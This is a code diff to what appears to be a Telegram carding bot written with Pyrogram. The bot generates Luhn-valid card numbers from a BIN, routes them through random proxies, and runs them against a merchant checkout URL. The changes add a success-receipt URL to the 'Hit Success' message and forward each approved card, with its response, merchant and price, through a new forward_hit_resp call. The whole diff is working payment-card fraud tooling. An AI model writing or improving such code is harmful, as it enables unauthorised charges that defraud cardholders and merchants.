@@ -3,7 +3,7 @@ import time
 import asyncio
 import re
 from pyrogram import Client, filters
-from FUNC.defs import log_cmd_error
+from FUNC.defs import log_cmd_error, forward_hit_resp
 from FUNC.cc_gen import luhn_card_genarator
 from FUNC.proxydb_func import get_random_user_proxy
 from TOOLS.check_all_func import check_some_thing
@@ -140,19 +140,24 @@ Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt; (6-16 digits)</b>""", message.id)
             getresp = await get_hit_resp(result, user_id, fullcc)
             status = getresp["status"]
             response = getresp["response"]
+            receipt = getresp.get("receipt", "N/A")
+
+            url_line = f"\n𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐔𝐑𝐋- {receipt}" if receipt and receipt != "N/A" and "✅" in status else ""
 
             await Client.edit_message_text(message.chat.id, progress.id, f"""<b>
 {status}
 
-𝗖𝗮𝗿𝗱- <code>{fullcc}</code>
-𝐆𝐚𝐭𝐞𝐰𝐚𝐲- <i>{gateway}</i>
-𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞- ⤿ <i>{response}</i> ⤾
-
 𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
 𝐏𝐫𝐢𝐜𝐞- {price}
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞- ⤿ <i>{response}</i> ⤾
+𝗖𝗮𝗿𝗱- <code>{fullcc}</code>{url_line}
 
 𝗧𝗶𝗺𝗲- {time.perf_counter() - start:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
 </b>""")
+
+            if "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝" in status:
+                await forward_hit_resp(fullcc, response, merchant, price, receipt)
+
             return
 
         # ══════════════════════════════════════
@@ -184,6 +189,7 @@ Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt; (6-16 digits)</b>""", message.id)
         stopped_reason = None
         winner_cc = None
         winner_resp = None
+        winner_receipt = None
         results_lines = []
 
         for card_str in cards:
@@ -222,6 +228,7 @@ Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt; (6-16 digits)</b>""", message.id)
             if "✅" in status:
                 winner_cc = fullcc
                 winner_resp = response
+                winner_receipt = getresp.get("receipt", "N/A")
                 stopped_reason = "Payment Successful ✅"
                 break
 
@@ -234,21 +241,21 @@ Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt; (6-16 digits)</b>""", message.id)
         all_results = "\n".join(results_lines)
 
         if winner_cc:
-            await Client.edit_message_text(message.chat.id, progress.id, f"""<b>
-𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
+            url_line = f"\n𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐔𝐑𝐋- {winner_receipt}" if winner_receipt and winner_receipt != "N/A" else ""
 
-𝗖𝗮𝗿𝗱- <code>{winner_cc}</code>
-𝐆𝐚𝐭𝐞𝐰𝐚𝐲- <i>{gateway}</i>
-𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞- ⤿ <i>{winner_resp}</i> ⤾
+            await Client.edit_message_text(message.chat.id, progress.id, f"""<b>
+Hɪᴛ Sᴜᴄᴄᴇss ✅
 
 𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
 𝐏𝐫𝐢𝐜𝐞- {price}
-
-{all_results}
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞- ⤿ <i>{winner_resp}</i> ⤾
+𝗖𝗮𝗿𝗱- <code>{winner_cc}</code>{url_line}
 
 𝐂𝐡𝐞𝐜𝐤𝐞𝐝- {checked}/{len(cards)} | ✅ {approved} | ❌ {declined}
 𝗧𝗶𝗺𝗲- {elapsed:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
 </b>""")
+
+            await forward_hit_resp(winner_cc, winner_resp, merchant, price, winner_receipt, bin_str=bin_str)
         else:
             stop_line = f"\n𝐒𝐭𝐨𝐩𝐩𝐞𝐝- {stopped_reason}" if stopped_reason else ""
             await Client.edit_message_text(message.chat.id, progress.id, f"""<b>
